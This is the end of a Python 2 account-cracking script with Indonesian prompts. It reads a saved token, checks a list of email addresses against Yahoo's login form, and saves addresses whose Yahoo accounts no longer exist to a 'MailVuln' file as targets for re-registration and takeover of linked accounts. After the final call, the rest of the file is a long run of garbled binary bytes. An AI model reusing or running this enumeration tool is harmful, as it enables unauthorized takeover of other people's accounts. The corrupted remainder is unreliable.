	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile tersimpan \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()


def clone_dari_file():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	files = raw_input("\033[1;96m[+] \033[1;93mEnter the file name \033[1;91m: \033[1;97m")
	try:
		total = open(files,"r")
		mail = total.readlines()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mFile not found"
		raw_input("\n\033[1;96m[\033[1;97mEnter Back\033[1;96m]")
		menu()
	mpsh = []
	jml = 0
	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
	save = open('out/FileMailVuln.txt','w')
	print 42*"\033[1;96m="
	mail = open(files,"r").readlines()
	for pw in mail:
		mail = pw.replace("\n","")
		jml +=1
		mpsh.append(jml)
		yahoo = re.compile(r'@.*')
		otw = yahoo.search(mail).group()
		if 'yahoo.com' in otw:
			br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			br._factory.is_html = True
			br.select_form(nr=0)
			br["username"] = mail
			klik = br.submit().read()
			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			try:
				pek = jok.search(klik).group()
			except:
				continue
			if '"messages.ERROR_INVALID_USERNAME">' in pek:
				save.write(mail + '\n')
				print("\033[1;96m[\033[1;92mVULN✓\033[1;96m] \033[1;92m" +mail)
				berhasil.append(mail)
	print 42*"\033[1;96m="
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
	print"\033[1;96m[+] \033[1;92mFile Tersimpan \033[1;91m:\033[1;97m out/FileMailVuln.txt"
	save.close()
	raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
	menu()
	
       
		
if __name__ == '__main__':
	login(){�1���n�XV23��p�fh�Ri�AM��*���c���v��U$���8�&���E7B�񐝄)I>{;�6���J�$Hv�tB�!s^�%�+/Y�79�G�vt����v�{�o����,M��"�d3=���"7/���n���J��t.W��!�!D����MժAν?���a�9��3�`*O�pK��4Jz�[������4���#�#���1�G���mub�1o*k%%�K�Z���*5������$#�$	���o��SX�
�`��p['Бl�4΅`,���)����xXe������r��:����|��{��4����.=����0{C/��:�J�U������U	|1�OgН*�*���^*>�s��k�{��O-Z�6��0�z��-9�UTH��d��?�W�,9����}����ۄTVi���:�+N�����Kb�M��a��Y�N���g�i�2�;ؠ���{�X$#P�I�r1$�3]�iP��!���&��r�c�H�1c��gp�cg&������i蜨x�*Iv-�gn��8������v�i���8��!�r"08��܍���*����o��V$�^c�ۮ�q~8�^��9��A�	��d�J�V����9�0Q�<���݇��%��ٻ�#E�Q��̰��Q�WfZ�Y��Ƃ�ї.?�Y<�c"��:;K�P$(���89���.5OU2�2'��L�x]��n_��na�y!�P<��REޗ��^���)\�2�;!�I�N�,6f[a�B�/>�S�9Da	,FR�>��J#^��P�մ��\�<�:2�+j�Sx�1���VZ��u����)�k�Ú��������_����l���ԥ"����'���\�)�Wl%�����t+�Je��CB����V��Dr
�w/e�P@�d�CZu�87��/�rx
k��<9�m�i�E� �zH�*ͣ�a�*�,}׹;٪�$Ͷޙ�X�A�AT�J������s8T�tS(M7����9Zl��aϹ������^�h�F�����ǘ#~ÿթ��"���.��u���XGx��;�-�a��˩U�v׃�$�kQ�?�����֠m%5���
џ�?п<��3,=�K�V7�đ�I3
���ߥ�7do�Սw����,D�^"$M���K��*���xr?p�=��zy�h�r׊|���s������+�Y�|uZ�0��;q�Fl���x����uW��P���}��|�@DŘL��s��Y�H?E�T���>,xNq��i��9nId��3~^�\t�@��"�"�{�>T�,����Cdf��rO,����O�l+ﺝL�~�
f��+r!�����	L�يƧB��d�G�dl_V��
��T��.L�FQ��D��)�@f�U�\^HH�t�FH^F$G��#K��"����1]��c�"���U-��]��[�؀���˟+����}�?����g(U5��߼j����*�������s��@]p�J��3X菒���Щ�[���ķ������D�����"_OU��_����`�F�NOd��x�a6��'m�[��T\�wo@^�^�.��!ȽS��բ/=�
�fcD6��Jlc�	�iN^�)���l��ڡ���C��ּ�\���a�o�³(� �
�Xq�ֲ�U�Gc˃@�^
���9��r�|)�H�9)"ա�.0S�z��3�R�ʌ�
|,� °`12�
��Iے������}�O���M���զt�FwG࿼:Dn�?��P�B�2��݆��s��`��������P�8Y��5���	�|D�!J�R���@Nfj�3���ŝ}#��iPj:�x�S��M0�L*7z&�Oъ,o&����,'�����tg��:Q����dpŝxQ~��Ə$F~/�p;9�k���S{��R����`=y��S�N�Th"�s)�/ ���!M��|uI�-Y35�&c�-9EK�9�CI��vf�2�>��� b$�:�>LމI�)�,�|�۹����fnD��m�T�#=�)A�I����M�m�VuFt�T%�Ħ��.V�vG{ g�x8_��!��'/���N���R��������_�)Y�� ��v���<�D���o�����L��x;��ꔷ�OC�d-H5���,<lf�|��
B����ĚY>;���Q���;��"{�(qM���Ey�2�eޒb��S���	RY9	�6��T�#����	�
��8��"����m�q9������$ҋ+��+��
��r�QC��?Ӡ5=��"�0�{��8�ݰ!Q�hI���� �b�D#����vA��/���`+*�����c�)����]tO�yw�ya+j? �yC��wY�t!'G�r�Z%ځ/�/2a���M�3'N(�۠5�=�n96�R>>#��
����L#l�3�l>lE,�&��sЛxN��dZ�逸��Ȓ.G����w�2+�
�ֿ�MI�J���T%�L��
i��
��us+h7��u՛�@��l�����z{��u���*L����V8�pG��k_�KD9Y���R_�%H�ncB��62����}���0bG�xg'mT�zk�$L���uf�͆�uӲ/ax阮��FSs������n$�XN`iJ�$�9�u�d�1?�7���x���J�xp�汰��Hn���
�5b��Hm^`l�Lv�^
Pg�~h���Q��1�!�(F!������4��QW��N��d��r 5�(��o;�V�
 ���r~.l$�T?��',\�˴.�By��M���M�u�����y}3$��?]n���V���~�1�i��Z�rZ�Q2S�#d%�r|�8�vh��Em��7*f�-���b��Vo��p'R��2��:��a2vz9/�m��C��[�
 =�M?����y�EJ�:���#+�1����<C���6����ʷ�;�J<��jW�^�߯)��K(�W�:�z(k�Qo�8��?�������A��2��=bS-�:p
��먲$�0�H��*O����"��2㢊3��+/0��E
�*�3�uGa��k������j�o#p�Q�0
�#ޢC��J��P�f��a �.�j7w�@��ƴ^-��NL�x����N}DIۡF�RX��H||��o���T7�% ��ɊS?%��Ww����ͷ(�'����J��G�.'��(��Lv��{�!����$�R�
3k���u�ՌB5oȦ�b�����Fnvk!�)x�������`�I'�	��ރ�H�~��u�+��'A�ô7
���ɐ�W5�n���~�&G�o��vIN+�"�&@��L4N/J��/]23)��kz� �~������n6���*X�
&��ȹ�޶Q2k�̐�W9��E�3p4\T����h׍h�w�"�}�<�V�m@�?�����Ʉ���ʽ��W���b``وj|ޯleS�q�֢{nE����o��eT�
,��R�	���I�B>c���Įs#� O+\*�7x0��&�@^?B0�����o��p�4ޕh�:ܺ?�i9��Uw�X�(5�;q���8&�;�X=߂':��B&6<@7]�'�ttG��?�o�U��j���d�(1t��J�����UX�嵆�՟C��)���I%�Ǽ��;�x��:&"t�2�c�yC%p6��FSȯm�ֶKJ	X�0?�|��
�X���z����'�יi
Ķ�=���z	#Qz��h��j!eP�ˉ��ix�������&N������Y�]����V�
��z��Z�*�A��)��Ͻ���Qr��X�]���8Y#��PDX��
���,�,	+6�k��R�g���HL�Ī�f��j�f5b�"\�zr^�j:B��Ԑ'���iQ_G�Q�q(.K��%<1%���m�y�9i��c���[�~Djx`'���AQ���	�U�=����ͺ"t�(.\ ��z�8�P�/�{�"S�L5k��L-K���M^5~��G�8Hl�li��˶Β�@a����E�X?x����U7���Eq��Ƴ*�uW�ƫ棆�*YN;Nեe�\Ʉ����l~�bO-a�e��'_�:���nN5��qM3�{�xv��TC��Lя�P��ù�7y@Ӄ���"8Ay�9�^�$�
u���'֢\�{0X��޿4�<a2YD��X�F�S�|�yD_-�(�ϸG)���(V3��ŵ�
n��ʫp���S���E4c.C������UFI,��H-ٟ=�"�N~���=�0;G��W�U��I�͉"�ù��ۚ���S$8��D�Hv��<��~���&c�05���)8Ѱ�әIe0�.�И�d$���:B����5��8���;Ւ�@N$����M���V%�)s�!�'OP�Hl0k3��^q	<�]$��2�f/X�]��F������Q\��x�h��v)�O∾�N�Ilfx�c� )��ý�Ju�YC��Cv1��N0y�ZA
�ě�d�#҇d���ܐ
�`4�X-�h1%uk�P����K|�9|�1){"�]���J�
g��r1: SVA�
�[���Z�5$ A&T��1dJ�zRL�cC���0fi@�:����qO�͘�_(�'�BC��`��:����^��q�I�hI�pq5$5�A��V���L��^&���n,��?�SɅ���Rlb*�P�)d��)A���$/_�����;�r���fL����s�>�;\	%�a�V$Kky!��{���������6��O��ڝ�(^���^�Wp&�r���.=��I��7��J�R�!�1O��C��M�J��ɺ�)��^��ZO���
�z3v۫L�e`�W*��y�{�Q�U��R9r����#=��8�m���ܐ
�`4�X-�h1%uk�P����K|�9|�1){"�]���J�
g��r1: SVA�
�[���Z�5$ A&T��1dJ�zRL�cC���0��EZ'�i��`^z{�
������J��=qe���:����^��q�I�hI�pq5$5�A��V���L��^&���n,��?�SɅ���Rlb*�P��~��j��X�I-�M{N�By�ӥ����\=���s�I-I������#D'G�����a\i6���������6��O��ڝ�(^���^�Wp&�r��Ҕ�������k߳�l������c�����3�J�)3�|cv����2��f�̐�>�s4��p���t�w#&&�V��~��!�=�R�Ec�28v/��`��;���kt�b7���Kc����I���s����İ4Y=��ҁA�s�0Pӎq���V�����N�0�O=ws�۱���b)v%1�K��K������uIsc��"�8��pu5���)VfRA���rA�YX[�s�Fi>�
i)%#L�vL��6w
�R[���������JT��dp��Cn�����,����	�����QX�C����	6�f�
�:�p:F�b�h�ut(���ئ���d������}�7�N��ҩkz���$��lnΆ�d��'�q�2��Jw�r�@��e��hi ���G�c�#�jB�'�Gݟ��Ϟy��CO���$����)p�-7� ![����y��*��*KT����zN7���`�~<B�����2�,Y{�܆�<�b�d�@��я�\��uc6"Nnsq����ܒ��&��J�q\x�������C߷
�vN��*/}a�s���G�f��2���OYM��C�[�G ��A7����q���j�8�F$I��3�P\H��l'��E�^�q��/X�1�Q�>A�M��a��(�٬��.��5�K�D�e�/��T���En�r�A�����,x�;�ĈȤAzQ�7n��Ò��gZe8�N�fo�-��Z.h(|k�J�}�nQLjYjݐ�66x�=V���k�M2�����w�`�N������
Xnr�t�O��.D�CW�~�L*��:��}�6J��R�7�R�x*�d�)��ÛM�	���e���Fl]���֧
��c����r�`TN����꒬A��Hua��Q^*u�Ɓjf>�&�g�_yh�>�j��=}�G��.%�ӡ�,����-�3�N=��X,<ū�F�t��>]�ݦq%����u����ξ��S���YCIS��x�ɳ�]���So������4˹���X�?���+:еd��c�k̮�0,c��S+���n��`n9<�WD5�!���	+�|C��$Њ8w`z�a��T]���.n{~��/�S����p�(E�9��y�.5d9�[uL�m#����'�R�Z�W����T	L�PK�����V_�׃�7�'��Ԍ@�L`^��&-w����,�Z�#hk/��m�c��$�Xm7��Ӊ��	�8�1-���D�����3@ѴE��&�px�ժ�fʝ�;�m�%�_��3yk���ߋ�w����o����P��h�L����K��:��j�1���b2)���;�O0�*��)�k?	M�m撝����~pF.|�C�k�I�>�R[���Q
w�q��tCr�cJ45��j �^�|�u�;����W3�#�~8�آ�C�{�R�	̞��}X<�W���_-��/���lWN�EW��Gb�Ҙ��Wi�;?�>܀�Km^�����^\Z�v��&��ǿ�%t�;h�|�5�K�b��7w��6�*٨�������ea�v��CnÇ* �
e�A!~"�sã|ub�E~��^I�����錴m4���я�0ǃ*v�E[{c�P
²qé�a9ʏγ9���#i���s�B��Z.�1�8�]*pY�~ϓn�W���j����N
I+��s.�h'�9�2-c솲Ȟ��\��P�O����QAF�[m�
_��2������N����<l��;K�
E�%q�P�;r6լX
/�hZ��}��e2%��5��ױ�q��)��64��<�U��v����jS$?>��	wۅ�����Ki8���ށ���Q흜�����P9�⣈��˓����A�z]\�zlg�|��Q�wU�y�߬�Y��yuV"Β�@�vThz�B���-�^M�qG�J�R�x&e�0
�l�$�;�%�����7�>t�,P7�)�}�[�\(�qbjw�}B�R�9S�L�^=�	"�vʪ<q9�#�8 �2i�P����V����x,��sx�e�Ml����P�|B��ڸ.
����ɥ�ܔv���XV�ƚ#�F�B�}H^�Đ��(T�T6xHQ?dh����m�乔mS62�=��5�j\�V��w%\�h��@(:��.
j�,	|��;�5�Nj�ި��ecQ7����E�<�F�\�x�O�[�ߍ��
^Ӟ�,�v��4��ɮ���KL@?�O�eѝ6=a����߱S4�֒�~F�z��~R/ę���t#{Xʢ9ȵ�0�(M�@�jl/��C�TTK���/ט-h;R���8��DAԓ2�F�2��2�K���:v7c�㨆�>�V8[���4�~i`Yu�u2=�ow�`h������?|
�K({Y���	ڐ}w����⁠�s��1�r�������)l��	��1/E�����;&ұ�5[���/[���ctgl��a�]:�ҏ�.�C��i��e��W�?�>�iS�G4M�i��^�c�q[@�T��Ȭ$���dA�|�E�	�eO���#[�	b�`�t�kCOl����a�����ɒ[��2g#�0F�˞͐o"��H��^W�8�+��1k\k�hT�	\1���<�g쇮�/�oV��vO�؏�(���.�=15A�7sڲSp�U��_�Wt� ��= �p?G�L#2dsc��[��m+�:�'�v�:o����:Ğ�9����S���A �ۯ�B�w�ٔ�R���sƣ�����Aw��lh�4
�f?~�1�^�᫼r����f;M�v�s�
>K���G�!ݽ8̪�}����y'e`��u�/vE��jbn�	d����i;�G�<�*�9��uH�0v*0��!�z�*�!|�Oͤ�m1K!�^�-��D�Z@��<0��#����KM�Y�I!~���npC�%��#������Ч=ź��h���QP�����K#���ė�����V�e=I1D!0q����7R��]� ?�7���4tMփО�7�Ә~�2�V#N�{e�d�u���p���6�������W�U��	+j�O�+:	Ϸ?��`G��v-�q���g�q�/m�(~WW����2��|e�Ml9� or˒0�H�P�2pG�|��b���0k�M��3��� �����܌�ayU�G!@��]����Ru�<[+�c���(WЏ
n��J�+���	��A�g	�i��z55zn����6�d�+� ᐹ�1N��	�t{'��A$5��W��-K���/�";���&K�t�"�.��r�1�e+�U��g�8M3�ǸkG��#ANL#J�R�l_� �O�'8HK������IƘm�o�rub�"�}���=�^�X��>�t~��K��JWW7ԭ3�7�'m0�FPa��������|�ᰙ�h��L΍'�b#'�wA�P`Կ�RY�X|�ӜK�⯝�Oo.qheO´����#���r���5�C4����Nn������VǢ���ʰوM���X�	�a�w	�5��_�Q%����df5�J��`�֟�<%��H�Q��;�k����F��<߷L8���ʆ{ءA�:�J"P�$�c5���I�$�u��ՊK�2�9;�����q�Q)��u�z�21 �X}��JjI:0�nP��f�)�wE����G,@��p����gR�^3b`�"�KH_d��r�H�
�u�u�;6c!e��\+�&��:5�-�#TpY]?=)�
��=I/�E�?�2K��W��iy���-�����OM����:����R=��Q��P������vB�����B�V��wa�c��C���
��k�᭄$�Aup���7�uT�~h8�tc�?t@J�3�[뒨�G�,��JA��i�?'�v�7E�RD����i
�I-��S�	�i��3>h$.-vt:��W��ĵ$E������X���،��.PF�a�r+�}��rj�!�{���>�y��*~ľ�}�ҥ_��S��x�̰�Z��R�e�BC�L}��-�7G�����Z�:$7v��3ҹ���j<.�FÞ���n��]p{�V�� ��w)��#<��+�����J�"�
�L�\)_�8j�H���s�����Y5��!tS�Nml����Yy]���?��jj�2����\���Ɣ�}w�%�P#UL�B�._n�:�?���Ȥ�ES�4�ăi"P�r�H�::��&|�i��V0ӷ�\YN����h���=�3��q�M�Kl�x��1��k���7޲zz(j7`�DMFJ6S6�t���.����R��u��!�b�e��zǰ
t>Y�B�����Z҃E:{n���{�;��9 th�鎼6��h���I��NgEQ�U�S�`"!�\��|aچ�%��l��S�%)r��K��_��݋7��ys!�����mz��������E�M,�D2�l�74���:s�.u��&0�M���!;��������?��9+�}���6��jfT���ٞ��c~�v�_�@���ʆ��>�P���eU�Ӣ���z&@�)y�wH���.��&7�8؂��Z��-[8&�C�
�3t+I�~|_�u�~�J�Lؠ�v:�z��?^�6g�=�z��Jpr�dD�ω���?8���/a2�e� �b$���Bkv[��Is�C��ެ�z	����9��e�a��:A�$�\J"Lx��� /�]�{���F����H�
8��܌z�Ѽ�]«FO�5J@C,H�Q��IC��3�+��?�d%\"m���IFs�5Xi(���e`�4%�ܤ���f���D%<򖵽�����Q2Zw�z�S���D���5^vs�i`a�O�B��v�8�_4*5�S���y܍ tD�5���8����M�J�����D��댥Cj<�Z]x�S��DQ�1�
m�x�n��"�&*~Pݒ�M���G5����M��9�R*�o.1���cxE퍚
ӧ�����&v�L�������-G҆�eS��%�ʽ�N�I��+�����?W�̞V0���|3�{L��܃L��j�(=D݄N&>��5+]jN$�U������tCW3��c��k�ԄmQ��4TR��bH��h�l���A�&|����V�h,�[-�����T�����S�93��G�\n�@.8�~x��T95\�P������7�G�����,��ַ�����R����Z��+F�I��]l{P+\��{�U�S�B�H(�8gBN]�f<>�i������N\�E>���P��Yp��5��cCq8�'�v��;J��/n�?��l�i?�U�=t�t<�	M�I�:�ɰ"��
%����O�Ɲ���aΟ��z�����_I(��F���HQ��n�9b���T�e�S/�L�ψ�TO[�5��G�G-��=�N��)�b��]���L���� �#�oB������k
�X�KUA����]�d<���iI9˻e/�]?����d���Vg�{�9+��3h7@؝�NGTG�M����~�(|a�e]0�۫@��b��
h���6�aZU�Ё8i{{�K��bn�+��	�u�q-!���^�lhJ?��	D�0���o���4�J�o�}q��r�=�����x�r��&�Y�rop�M����5�zZ���+�Un��A�{�Fg�I�G,�4*�펪Gq�X���!c���?t�E@oN@(��eS��Qz��1R
�S�;ntj���,���jW-��s�:�6��\$��'N����+�zEm�۰�_ª�N�t}�ʖU08?L=��O��n[���MI#Uy���|��<`�$����:�9߃�?�Xn=�(VDg�Tyg�
E�Z��B vv/?2+�_�&R�֑m�>P8��
�0�"�΂��5e�J7Q��:rEW�z|���:.�ѵ���?
v\��*Ƀ z2���r�W�y����.��
`�߁���(V���HFW8�_�nk�8N�'G�<�~ΓPk~���-�ߵ����I�Lʼ
 A��e��{�����M>�uס5��^v�� cX^ͤ~��TD-�z�+h�&;�ɴyZ��&�O�!����f�fc��mΦd��v�w�A�`����PLX��.�Z5ͺEWp�5[�y�ی�?��5�Q��0�F�2vT��`�S�»�ktl�S|�1���dSL/h�|�!E�%E7а�G,-��Fo@� ��`B���A�2ڵo��Y�t�m����]�^�y�j����=�1�\�_�3�η���x��8Ό�E�*5Qd�������X.~a&�]g-�C  ��E�d:QE���5z���9���GUb�P�z�4�I��^9T�Dpi�9�W�#.q����R�^Z�ԘB�*�m�n^b�LԠ;l���)
гF~���� �߬��9i@�o+hjI!p`���^3oO>�~}��k���"�2�U���n}/#던��~-
�|/��f���M�M�ƴa5N�d�Xv&���{=4}�O~js!#f[g-0�웿�W����b�:wm��_d߮mbo�p��~Kw=r�lt�b\��/�{s�̊��'�<g�r���-I(`'�|d���
�a�|h�@���[9t��' �$�-�^'�A�vH��c